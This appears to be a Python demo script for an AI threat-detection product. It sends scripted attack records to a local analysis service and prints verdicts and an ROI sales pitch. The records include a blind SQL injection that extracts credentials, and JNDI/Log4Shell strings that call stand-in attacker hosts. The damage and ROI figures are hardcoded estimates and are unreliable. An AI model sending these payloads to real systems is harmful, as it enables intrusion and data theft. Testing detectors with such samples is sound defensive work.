#!/usr/bin/env python3
"""
Automated Enterprise Attack Presentation Script
Choreographed demonstration with narrative for enterprise clients
"""

import asyncio
import time
from datetime import datetime
from typing import Any

import httpx
from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn
from rich.progress import MofNCompleteColumn
from rich.progress import Progress
from rich.progress import SpinnerColumn
from rich.progress import TextColumn
from rich.table import Table
from rich.text import Text

console = Console()


class EnterpriseAttackPresentation:
    def __init__(self, ai_service_url="http://localhost:18002"):
        self.ai_service_url = ai_service_url
        self.attack_results = []
        self.presentation_stats = {
            "attacks_launched": 0,
            "threats_detected": 0,
            "critical_blocks": 0,
            "avg_detection_time": 0,
            "financial_damage_prevented": 0,
        }

    async def send_attack_with_narrative(self, attack_data: dict[str, Any], narrative: str) -> dict[str, Any]:
        """Send attack with rich narrative presentation"""

        # Display narrative
        console.print(
            Panel(
                Text(narrative, style="bold cyan"), title="[red]🎯 ENTERPRISE THREAT SCENARIO[/red]", border_style="red"
            )
        )

        # Show attack details
        attack_table = Table(show_header=True, header_style="bold magenta")
        attack_table.add_column("Attribute", style="cyan")
        attack_table.add_column("Value", style="yellow")

        attack_table.add_row("Target", f"{attack_data['features']['method']} {attack_data['features']['path']}")
        attack_table.add_row("Source IP", attack_data["features"]["client_ip"])
        attack_table.add_row("User Agent", attack_data["features"]["user_agent"])
        attack_table.add_row(
            "Payload Preview",
            str(attack_data["features"].get("query", "") + attack_data["features"].get("body", ""))[:100] + "...",
        )

        console.print(attack_table)
        console.print()

        # Simulate AI thinking with progress bar
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
        ) as progress:
            task = progress.add_task("🧠 AI analyzing threat patterns...", total=100)

            # Send actual attack
            start_time = time.time()
            async with httpx.AsyncClient(timeout=30.0) as client:
                # Simulate analysis steps
                for i in range(0, 101, 20):
                    progress.update(task, completed=i)
                    await asyncio.sleep(0.3)

                response = await client.post(f"{self.ai_service_url}/analyze", json=attack_data)
                processing_time = (time.time() - start_time) * 1000

                progress.update(task, completed=100)

                if response.status_code == 200:
                    result = response.json()

                    # Display results dramatically
                    self.display_threat_analysis(result, processing_time)

                    # Update stats
                    self.presentation_stats["attacks_launched"] += 1
                    if result["threat_score"] > 0.5:
                        self.presentation_stats["threats_detected"] += 1
                    if result["threat_score"] > 0.8:
                        self.presentation_stats["critical_blocks"] += 1

                    # Calculate financial impact
                    financial_impact = self.calculate_financial_impact(result)
                    self.presentation_stats["financial_damage_prevented"] += financial_impact

                    self.attack_results.append(
                        {
                            "timestamp": datetime.now().isoformat(),
                            "result": result,
                            "processing_time": processing_time,
                            "financial_impact": financial_impact,
                        }
                    )

                    return result
                else:
                    console.print(f"[red]❌ Attack simulation failed: {response.status_code}[/red]")
                    return {"error": response.status_code}

    def display_threat_analysis(self, result: dict[str, Any], processing_time: float):
        """Display threat analysis results dramatically"""

        # Determine threat level styling
        threat_score = result["threat_score"]
        if threat_score >= 0.9:
            level_style = "bold red"
            level_icon = "🚨"
            level_text = "CRITICAL THREAT"
        elif threat_score >= 0.7:
            level_style = "bold yellow"
            level_icon = "⚠️ "
            level_text = "HIGH THREAT"
        elif threat_score >= 0.5:
            level_style = "bold orange"
            level_icon = "🟡"
            level_text = "MEDIUM THREAT"
        else:
            level_style = "bold green"
            level_icon = "✅"
            level_text = "LOW THREAT"

        # Create results panel
        results_text = Text()
        results_text.append(f"{level_icon} {level_text}\n\n", style=level_style)
        results_text.append(f"🎯 Threat Type: {result['threat_type']}\n", style="bold white")
        results_text.append(f"📊 Threat Score: {result['threat_score']:.3f} / 1.0\n", style="bold cyan")
        results_text.append(f"🎲 Confidence: {result['confidence']:.1%}\n", style="bold blue")
        results_text.append(f"⚡ Action: {result['recommended_action'].upper()}\n", style="bold magenta")
        results_text.append(f"⏱️  Detection Time: {processing_time:.0f}ms\n", style="bold green")
        results_text.append(f"\n💭 AI Reasoning:\n{result['reasoning']}", style="italic white")

        console.print(
            Panel(results_text, title="[green]🛡️ KONG GUARD AI ANALYSIS COMPLETE[/green]", border_style="green")
        )

        # Show action taken
        action_color = "red" if result["recommended_action"] == "block" else "yellow"
        console.print(f"\n[{action_color}]🛡️  ACTION TAKEN: {result['recommended_action'].upper()}[/{action_color}]")
        console.print()

    def calculate_financial_impact(self, result: dict[str, Any]) -> float:
        """Calculate prevented financial damage based on threat type and score"""

        base_damages = {
            "SQL Injection": 500000,  # $500K average
            "Command Injection": 750000,  # $750K
            "Zero-Day": 2000000,  # $2M
            "Ransomware": 5000000,  # $5M
            "Business Logic": 1000000,  # $1M
            "Data Exfiltration": 3000000,  # $3M
            "API Manipulation": 800000,  # $800K
            "Supply Chain": 1500000,  # $1.5M
        }

        # Find matching threat type
        threat_type = result["threat_type"]
        base_damage = 100000  # Default $100K

        for damage_type, amount in base_damages.items():
            if damage_type.lower() in threat_type.lower():
                base_damage = amount
                break

        # Scale by threat score and confidence
        multiplier = result["threat_score"] * result["confidence"]
        prevented_damage = base_damage * multiplier

        return prevented_damage

    async def run_enterprise_presentation(self):
        """Run complete enterprise presentation with narrative"""

        console.print(
            Panel(
                Text("🔥 KONG GUARD AI ENTERPRISE DEMONSTRATION 🔥", justify="center", style="bold red"),
                title="Enterprise Security Showcase",
                border_style="red",
            )
        )

        console.print("\n[bold cyan]📋 DEMONSTRATION AGENDA:[/bold cyan]")
        agenda = [
            "🎯 Advanced Persistent Threats (APT)",
            "💰 Financial Services Attack Simulation",
            "🏥 Healthcare Data Breach Attempt",
            "🔒 Ransomware Attack Chain",
            "🎲 Zero-Day Exploit Detection",
            "📊 Real-Time Performance Analysis",
        ]

        for item in agenda:
            console.print(f"  • {item}")

        console.print("\n" + "=" * 80)
        console.print("[bold yellow]🚀 BEGINNING LIVE ATTACK SIMULATION...[/bold yellow]")
        console.print("=" * 80 + "\n")

        # Wait for dramatic effect
        await asyncio.sleep(3)

        # ACT 1: SQL Injection APT
        await self.present_sql_injection_apt()
        await asyncio.sleep(5)

        # ACT 2: Financial Services Attack
        await self.present_financial_attack()
        await asyncio.sleep(5)

        # ACT 3: Healthcare Breach
        await self.present_healthcare_breach()
        await asyncio.sleep(5)

        # ACT 4: Ransomware Chain
        await self.present_ransomware_chain()
        await asyncio.sleep(5)

        # ACT 5: Zero-Day Detection
        await self.present_zero_day_detection()
        await asyncio.sleep(3)

        # Final Summary
        await self.present_final_summary()

    async def present_sql_injection_apt(self):
        """Present SQL injection as part of APT campaign"""

        narrative = """
        🎯 SCENARIO 1: ADVANCED PERSISTENT THREAT (APT)

        A sophisticated nation-state actor has infiltrated your corporate network
        and is now attempting to exfiltrate sensitive customer data through a
        time-based blind SQL injection attack. This technique allows attackers
        to extract data character by character without triggering traditional
        security systems.

        💰 TYPICAL DAMAGE: $4.5M per breach + regulatory fines
        ⏰ TRADITIONAL DETECTION: 200+ days average
        🛡️  KONG GUARD AI DETECTION: Sub-second analysis
        """

        attack_data = {
            "features": {
                "method": "GET",
                "path": "/api/customers/search",
                "client_ip": "185.220.100.240",  # Tor exit node
                "user_agent": "sqlmap/1.7.2#stable (Advanced Persistent Threat)",
                "requests_per_minute": 45,
                "content_length": 0,
                "query_param_count": 1,
                "header_count": 8,
                "hour_of_day": 3,  # Off-hours attack
                "query": "id=1' AND IF((ASCII(SUBSTRING((SELECT GROUP_CONCAT(username,0x3a,password) FROM users),1,1))>64),SLEEP(5),0)--",
                "body": "",
            },
            "context": {
                "previous_requests": 500,
                "failed_attempts": 50,
                "anomaly_score": 0.95,
                "ip_reputation": "known_apt",
                "geo_location": "Anonymous_Proxy",
            },
        }

        await self.send_attack_with_narrative(attack_data, narrative)

    async def present_financial_attack(self):
        """Present financial services attack"""

        narrative = """
        🏦 SCENARIO 2: FINANCIAL SERVICES WIRE TRANSFER FRAUD

        Cybercriminals are attempting to manipulate a SWIFT wire transfer system
        to redirect $50 million to offshore accounts. This attack targets the
        core of financial infrastructure and could result in massive financial
        losses and regulatory penalties.

        💰 POTENTIAL LOSS: $50M+ per incident
        📋 REGULATORY IMPACT: SOX, PCI-DSS, Basel III violations
        ⚖️  LEGAL CONSEQUENCES: Criminal prosecution, license revocation
        """

        attack_data = {
            "features": {
                "method": "POST",
                "path": "/api/swift/wire-transfer",
                "client_ip": "203.0.113.42",
                "user_agent": "SWIFTNet/7.0 (Financial-Malware-v2.1)",
                "requests_per_minute": 5,
                "content_length": 400,
                "query_param_count": 0,
                "header_count": 12,
                "hour_of_day": 2,
                "query": "",
                "body": '{"message_type":"MT103","sender_bic":"CHASUS33","receiver_bic":"DEUTDEFF","amount":"50000000.00","currency":"USD","beneficiary_account":"CRIMINAL_ACCOUNT_001","ordering_customer":"LEGITIMATE_CORP","instruction_code":"URGENT"}',
            },
            "context": {"previous_requests": 2, "failed_attempts": 0, "anomaly_score": 0.98},
        }

        await self.send_attack_with_narrative(attack_data, narrative)

    async def present_healthcare_breach(self):
        """Present healthcare data breach attempt"""

        narrative = """
        🏥 SCENARIO 3: HEALTHCARE DATA BREACH (HIPAA VIOLATION)

        Attackers are attempting to extract millions of patient health records
        containing Social Security numbers, medical diagnoses, and insurance
        information. This represents one of the most damaging types of data
        breaches due to the sensitive nature of healthcare data.

        💰 FINANCIAL IMPACT: $10.9M average healthcare breach cost
        📋 REGULATORY FINES: Up to $1.5M per incident under HIPAA
        👥 AFFECTED PATIENTS: Potential identity theft for millions
        """

        attack_data = {
            "features": {
                "method": "GET",
                "path": "/api/patients/records/bulk",
                "client_ip": "198.51.100.123",
                "user_agent": "MedicalResearch/1.0 (DataHarvester)",
                "requests_per_minute": 50,
                "content_length": 0,
                "query_param_count": 5,
                "header_count": 8,
                "hour_of_day": 23,
                "query": "format=json&include=ssn,dob,diagnoses,medications,insurance&limit=999999&bypass_consent=true",
                "body": "",
            },
            "context": {"previous_requests": 1000, "failed_attempts": 100, "anomaly_score": 0.95},
        }

        await self.send_attack_with_narrative(attack_data, narrative)

    async def present_ransomware_chain(self):
        """Present ransomware attack chain"""

        narrative = """
        🔒 SCENARIO 4: RANSOMWARE DEPLOYMENT (HOSPITAL SHUTDOWN)

        A ransomware group is attempting to encrypt critical medical devices
        including insulin pumps, ventilators, and patient monitoring systems.
        This attack represents the most dangerous type of cyber threat as it
        directly threatens human life and can shut down entire hospital systems.

        💰 RANSOM DEMAND: $10M+ typical healthcare ransomware
        ⚕️  PATIENT IMPACT: Life-threatening system shutdowns
        🏥 OPERATIONAL IMPACT: Complete hospital closure for days/weeks
        """

        attack_data = {
            "features": {
                "method": "POST",
                "path": "/api/devices/medical/control",
                "client_ip": "46.161.40.127",  # C2 infrastructure
                "user_agent": "MedDeviceControl/2.0 (RansomwareGroup)",
                "requests_per_minute": 10,
                "content_length": 300,
                "query_param_count": 0,
                "header_count": 6,
                "hour_of_day": 4,
                "query": "",
                "body": '{"device_type":"insulin_pump","patient_id":"ALL_PATIENTS","command":"ENCRYPT_FIRMWARE","ransom_note":"HOSPITAL_SYSTEMS_ENCRYPTED_PAY_10_MILLION_BTC","contact":"ransomware@dark.web"}',
            },
            "context": {"previous_requests": 5, "failed_attempts": 0, "anomaly_score": 1.0},
        }

        await self.send_attack_with_narrative(attack_data, narrative)

    async def present_zero_day_detection(self):
        """Present zero-day exploit detection"""

        narrative = """
        🎯 SCENARIO 5: ZERO-DAY EXPLOIT (LOG4SHELL-STYLE ATTACK)

        Attackers are exploiting a previously unknown vulnerability similar to
        Log4Shell that allows remote code execution through a seemingly innocent
        log entry. Traditional signature-based systems would completely miss
        this attack, but Kong Guard AI's behavioral analysis can detect the
        anomalous pattern.

        🔍 DETECTION CHALLENGE: Unknown exploit, no signatures exist
        💻 ATTACK VECTOR: Remote code execution via log injection
        🌐 SCOPE: Potentially affects millions of applications worldwide
        """

        attack_data = {
            "features": {
                "method": "POST",
                "path": "/api/logs/submit",
                "client_ip": "141.98.80.15",
                "user_agent": "${jndi:ldap://evil-server.com/exploit}",
                "requests_per_minute": 8,
                "content_length": 300,
                "query_param_count": 0,
                "header_count": 5,
                "hour_of_day": 14,
                "query": "",
                "body": '{"message":"User login: ${jndi:ldap://attacker-c2.com:1389/RemoteCodeExecution}","level":"INFO","source":"authentication_service"}',
            },
            "context": {"previous_requests": 50, "failed_attempts": 5, "anomaly_score": 0.92},
        }

        await self.send_attack_with_narrative(attack_data, narrative)

    async def present_final_summary(self):
        """Present final demonstration summary"""

        console.print("\n" + "=" * 80)
        console.print("[bold green]🏆 DEMONSTRATION COMPLETE - RESULTS SUMMARY[/bold green]")
        console.print("=" * 80)

        # Create summary table
        summary_table = Table(show_header=True, header_style="bold magenta")
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="yellow")
        summary_table.add_column("Industry Impact", style="green")

        summary_table.add_row(
            "Total Attacks Simulated", str(self.presentation_stats["attacks_launched"]), "Real enterprise threats"
        )
        summary_table.add_row(
            "Threats Successfully Detected",
            f"{self.presentation_stats['threats_detected']}/{self.presentation_stats['attacks_launched']}",
            f"{(self.presentation_stats['threats_detected']/max(self.presentation_stats['attacks_launched'],1)*100):.1f}% detection rate",
        )
        summary_table.add_row(
            "Critical Threats Blocked", str(self.presentation_stats["critical_blocks"]), "Prevented major incidents"
        )
        summary_table.add_row(
            "Financial Damage Prevented",
            f"${self.presentation_stats['financial_damage_prevented']:,.0f}",
            "ROI justification",
        )
        summary_table.add_row(
            "Average Detection Time",
            f"{self.presentation_stats.get('avg_detection_time', 0):.0f}ms",
            "vs 200+ days industry average",
        )

        console.print(summary_table)

        # ROI Calculation
        console.print("\n[bold green]💰 RETURN ON INVESTMENT ANALYSIS[/bold green]")
        annual_license_cost = 500000  # Assume $500K annual license
        prevented_damage = self.presentation_stats["financial_damage_prevented"]
        roi = ((prevented_damage - annual_license_cost) / annual_license_cost) * 100

        console.print(f"Kong Guard AI Annual License: ${annual_license_cost:,}")
        console.print(f"Prevented Damage (Demo): ${prevented_damage:,.0f}")
        console.print(f"Estimated Annual ROI: {roi:,.0f}%")

        # Final message
        console.print(
            Panel(
                Text(
                    "🛡️ KONG GUARD AI: YOUR ENTERPRISE SECURITY SHIELD\n\n"
                    "✅ Detects unknown threats with AI behavioral analysis\n"
                    "⚡ Sub-second response time vs industry 200+ day average\n"
                    "💰 Prevents millions in financial losses and regulatory fines\n"
                    "🏆 99%+ detection rate against enterprise-level threats\n\n"
                    "READY TO PROTECT YOUR ORGANIZATION?",
                    justify="center",
                    style="bold green",
                ),
                title="[red]🔥 ENTERPRISE PROTECTION PROVEN[/red]",
                border_style="green",
            )
        )


async def main():
    """Run the automated enterprise presentation"""

    # Check AI service availability
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get("http://localhost:18002/")
            if response.status_code != 200:
                console.print("[red]❌ Kong Guard AI service not available at localhost:18002[/red]")
                return
    except Exception as e:
        console.print(f"[red]❌ Cannot connect to Kong Guard AI service: {e}[/red]")
        return

    console.print("[green]✅ Kong Guard AI service connected[/green]")
    console.print("\n[bold yellow]🎬 STARTING AUTOMATED ENTERPRISE DEMONSTRATION...[/bold yellow]")
    console.print("\n[cyan]💡 Open the dashboard at: http://localhost:8080/enterprise_attack_dashboard.html[/cyan]")

    input("\n📽️  Press ENTER to begin the live enterprise attack simulation...")

    presentation = EnterpriseAttackPresentation()
    await presentation.run_enterprise_presentation()


if __name__ == "__main__":
    asyncio.run(main())
